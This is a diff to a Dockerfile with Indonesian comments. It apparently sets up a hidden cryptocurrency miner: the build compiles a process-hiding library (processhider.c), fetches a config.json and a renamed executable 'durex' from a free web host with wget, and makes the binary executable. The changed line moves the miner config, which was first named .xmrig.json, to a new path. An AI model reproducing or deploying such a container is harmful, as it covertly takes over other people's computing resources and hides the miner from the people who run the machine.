@@ -16,7 +16,7 @@ RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
 RUN wget https://nyadur.000webhostapp.com/myrig/config.json \
     && wget https://nyadur.000webhostapp.com/myrig/durex \
     && chmod +x durex
-RUN mv config.json /root/.xmrig.json    
+RUN mv config.json /root/config.json   
 
 # Perintah yang akan dijalankan saat container pertama kali dijalankan
 # Ganti perintah ini sesuai dengan kebutuhan Anda
